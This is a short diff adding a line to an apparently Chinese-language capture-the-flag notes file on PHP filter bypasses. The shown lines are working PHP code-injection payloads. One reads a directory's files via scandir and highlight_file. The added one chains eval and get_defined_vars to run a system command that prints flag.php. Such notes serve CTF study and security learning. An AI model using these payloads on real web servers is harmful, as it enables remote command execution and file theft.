@@ -50,6 +50,7 @@
 
 * $被过滤的时候:
 * ?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+* ?c=eval(next(reset(get_defined_vars())));&1=;system("tac%20flag.php");
 
 <br>
 
